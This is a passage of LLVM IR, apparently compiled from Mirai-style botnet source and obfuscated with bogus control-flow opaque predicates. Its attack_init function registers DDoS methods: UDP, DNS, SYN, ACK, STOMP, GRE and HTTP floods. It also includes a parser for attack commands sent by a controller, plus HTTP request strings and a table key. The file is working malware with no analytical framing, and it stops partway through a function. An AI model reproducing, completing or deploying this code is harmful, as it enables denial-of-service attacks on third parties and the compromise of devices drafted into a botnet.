; ModuleID = 'host/ir_bcf/L33t.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.3
  %4 = load i32, i32* @y.4
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = shl i32 %59, 1
  %_1 = shl i32 %59, 1
  %_2 = sub i32 %59, 1
  %gen = mul i32 %_2, 1
  %_3 = sub i32 %59, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 0, %59
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 %59, 1
  %gen8 = mul i32 %_7, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_9 = shl i64 %61, 8
  %_10 = sub i64 0, %61
  %gen11 = add i64 %_10, 8
  %_12 = sub i64 %61, 8
  %gen13 = mul i64 %_12, 8
  %_14 = sub i64 %61, 8
  %gen15 = mul i64 %_14, 8
  %_16 = shl i64 %61, 8
  %_17 = shl i64 %61, 8
  %_18 = sub i64 0, %61
  %gen19 = add i64 %_18, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_20 = sub i8 0, %67
  %gen21 = add i8 %_20, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.5
  %25 = load i32, i32* @y.6
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %347

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %11, align 8
  %35 = bitcast i8* %34 to i32*
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @ntohl(i32 %36) #7
  store i32 %37, i32* %14, align 4
  %38 = load i8*, i8** %11, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %11, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 4
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %12, align 4
  %44 = load i32, i32* %12, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %63

; <label>:46:                                     ; preds = %33
  %47 = load i32, i32* @x.5
  %48 = load i32, i32* @y.6
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* @x.5
  %56 = load i32, i32* @y.6
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %347

; <label>:63:                                     ; preds = %33
  %64 = load i8*, i8** %11, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %11, align 8
  %66 = load i8, i8* %64, align 1
  store i8 %66, i8* %15, align 1
  %67 = load i32, i32* %12, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 %68, 1
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %12, align 4
  %71 = load i32, i32* %12, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %63
  br label %347

; <label>:74:                                     ; preds = %63
  %75 = load i32, i32* @x.5
  %76 = load i32, i32* @y.6
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i8*, i8** %11, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %11, align 8
  %85 = load i8, i8* %83, align 1
  store i8 %85, i8* %16, align 1
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 %87, 1
  %89 = trunc i64 %88 to i32
  store i32 %89, i32* %12, align 4
  %90 = load i8, i8* %16, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 0
  %93 = load i32, i32* @x.5
  %94 = load i32, i32* @y.6
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart213, label %originalBB6alteredBB

originalBBpart213:                                ; preds = %originalBB6
  br i1 %92, label %101, label %118

; <label>:101:                                    ; preds = %originalBBpart213
  %102 = load i32, i32* @x.5
  %103 = load i32, i32* @y.6
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %101
  %110 = load i32, i32* @x.5
  %111 = load i32, i32* @y.6
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %347

; <label>:118:                                    ; preds = %originalBBpart213
  %119 = load i32, i32* @x.5
  %120 = load i32, i32* @y.6
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %118
  %127 = load i32, i32* %12, align 4
  %128 = sext i32 %127 to i64
  %129 = load i8, i8* %16, align 1
  %130 = zext i8 %129 to i64
  %131 = mul i64 5, %130
  %132 = icmp ult i64 %128, %131
  %133 = load i32, i32* @x.5
  %134 = load i32, i32* @y.6
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart227, label %originalBB19alteredBB

originalBBpart227:                                ; preds = %originalBB19
  br i1 %132, label %141, label %142

; <label>:141:                                    ; preds = %originalBBpart227
  br label %347

; <label>:142:                                    ; preds = %originalBBpart227
  %143 = load i8, i8* %16, align 1
  %144 = zext i8 %143 to i64
  %145 = call noalias i8* @calloc(i64 %144, i64 24) #6
  %146 = bitcast i8* %145 to %struct.attack_target*
  store %struct.attack_target* %146, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %147

; <label>:147:                                    ; preds = %194, %142
  %148 = load i32, i32* %13, align 4
  %149 = load i8, i8* %16, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  br i1 %151, label %152, label %197

; <label>:152:                                    ; preds = %147
  %153 = load i8*, i8** %11, align 8
  %154 = bitcast i8* %153 to i32*
  %155 = load i32, i32* %154, align 4
  %156 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %157 = load i32, i32* %13, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  store i32 %155, i32* %160, align 4
  %161 = load i8*, i8** %11, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 4
  store i8* %162, i8** %11, align 8
  %163 = load i8*, i8** %11, align 8
  %164 = getelementptr inbounds i8, i8* %163, i32 1
  store i8* %164, i8** %11, align 8
  %165 = load i8, i8* %163, align 1
  %166 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %167 = load i32, i32* %13, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 2
  store i8 %165, i8* %170, align 4
  %171 = load i32, i32* %12, align 4
  %172 = sext i32 %171 to i64
  %173 = sub i64 %172, 5
  %174 = trunc i64 %173 to i32
  store i32 %174, i32* %12, align 4
  %175 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %176 = load i32, i32* %13, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 0
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %179, i32 0, i32 0
  store i16 2, i16* %180, align 4
  %181 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %182 = load i32, i32* %13, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %188 = load i32, i32* %13, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i64 %189
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i32 0, i32 0
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %191, i32 0, i32 2
  %193 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %192, i32 0, i32 0
  store i32 %186, i32* %193, align 4
  br label %194

; <label>:194:                                    ; preds = %152
  %195 = load i32, i32* %13, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %13, align 4
  br label %147

; <label>:197:                                    ; preds = %147
  %198 = load i32, i32* @x.5
  %199 = load i32, i32* @y.6
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %197
  %206 = load i32, i32* %12, align 4
  %207 = sext i32 %206 to i64
  %208 = icmp ult i64 %207, 1
  %209 = load i32, i32* @x.5
  %210 = load i32, i32* @y.6
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %208, label %217, label %218

; <label>:217:                                    ; preds = %originalBBpart231
  br label %347

; <label>:218:                                    ; preds = %originalBBpart231
  %219 = load i8*, i8** %11, align 8
  %220 = getelementptr inbounds i8, i8* %219, i32 1
  store i8* %220, i8** %11, align 8
  %221 = load i8, i8* %219, align 1
  store i8 %221, i8* %17, align 1
  %222 = load i32, i32* %12, align 4
  %223 = sext i32 %222 to i64
  %224 = sub i64 %223, 1
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %12, align 4
  %226 = load i8, i8* %17, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp sgt i32 %227, 0
  br i1 %228, label %229, label %339

; <label>:229:                                    ; preds = %218
  %230 = load i8, i8* %17, align 1
  %231 = zext i8 %230 to i64
  %232 = call noalias i8* @calloc(i64 %231, i64 16) #6
  %233 = bitcast i8* %232 to %struct.attack_option*
  store %struct.attack_option* %233, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %234

; <label>:234:                                    ; preds = %originalBBpart243, %229
  %235 = load i32, i32* %13, align 4
  %236 = load i8, i8* %17, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %235, %237
  br i1 %238, label %239, label %338

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* %12, align 4
  %241 = sext i32 %240 to i64
  %242 = icmp ult i64 %241, 1
  br i1 %242, label %243, label %260

; <label>:243:                                    ; preds = %239
  %244 = load i32, i32* @x.5
  %245 = load i32, i32* @y.6
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %243
  %252 = load i32, i32* @x.5
  %253 = load i32, i32* @y.6
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %347

; <label>:260:                                    ; preds = %239
  %261 = load i8*, i8** %11, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %11, align 8
  %263 = load i8, i8* %261, align 1
  %264 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %265 = load i32, i32* %13, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %267, i32 0, i32 1
  store i8 %263, i8* %268, align 8
  %269 = load i32, i32* %12, align 4
  %270 = sext i32 %269 to i64
  %271 = sub i64 %270, 1
  %272 = trunc i64 %271 to i32
  store i32 %272, i32* %12, align 4
  %273 = load i32, i32* %12, align 4
  %274 = sext i32 %273 to i64
  %275 = icmp ult i64 %274, 1
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %260
  br label %347

; <label>:277:                                    ; preds = %260
  %278 = load i8*, i8** %11, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %11, align 8
  %280 = load i8, i8* %278, align 1
  store i8 %280, i8* %20, align 1
  %281 = load i32, i32* %12, align 4
  %282 = sext i32 %281 to i64
  %283 = sub i64 %282, 1
  %284 = trunc i64 %283 to i32
  store i32 %284, i32* %12, align 4
  %285 = load i32, i32* %12, align 4
  %286 = load i8, i8* %20, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp slt i32 %285, %287
  br i1 %288, label %289, label %290

; <label>:289:                                    ; preds = %277
  br label %347

; <label>:290:                                    ; preds = %277
  %291 = load i8, i8* %20, align 1
  %292 = zext i8 %291 to i32
  %293 = add nsw i32 %292, 1
  %294 = sext i32 %293 to i64
  %295 = call noalias i8* @calloc(i64 %294, i64 1) #6
  %296 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %297 = load i32, i32* %13, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %299, i32 0, i32 0
  store i8* %295, i8** %300, align 8
  %301 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %302 = load i32, i32* %13, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %304, i32 0, i32 0
  %306 = load i8*, i8** %305, align 8
  %307 = load i8*, i8** %11, align 8
  %308 = load i8, i8* %20, align 1
  %309 = zext i8 %308 to i32
  call void @util_memcpy(i8* %306, i8* %307, i32 %309)
  %310 = load i8, i8* %20, align 1
  %311 = zext i8 %310 to i32
  %312 = load i8*, i8** %11, align 8
  %313 = sext i32 %311 to i64
  %314 = getelementptr inbounds i8, i8* %312, i64 %313
  store i8* %314, i8** %11, align 8
  %315 = load i8, i8* %20, align 1
  %316 = zext i8 %315 to i32
  %317 = load i32, i32* %12, align 4
  %318 = sub nsw i32 %317, %316
  store i32 %318, i32* %12, align 4
  br label %319

; <label>:319:                                    ; preds = %290
  %320 = load i32, i32* @x.5
  %321 = load i32, i32* @y.6
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %319
  %328 = load i32, i32* %13, align 4
  %329 = add nsw i32 %328, 1
  store i32 %329, i32* %13, align 4
  %330 = load i32, i32* @x.5
  %331 = load i32, i32* @y.6
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart243, label %originalBB37alteredBB

originalBBpart243:                                ; preds = %originalBB37
  br label %234

; <label>:338:                                    ; preds = %234
  br label %339

; <label>:339:                                    ; preds = %338, %218
  %340 = call i32* @__errno_location() #7
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* %14, align 4
  %342 = load i8, i8* %15, align 1
  %343 = load i8, i8* %16, align 1
  %344 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %345 = load i8, i8* %17, align 1
  %346 = load %struct.attack_option*, %struct.attack_option** %19, align 8
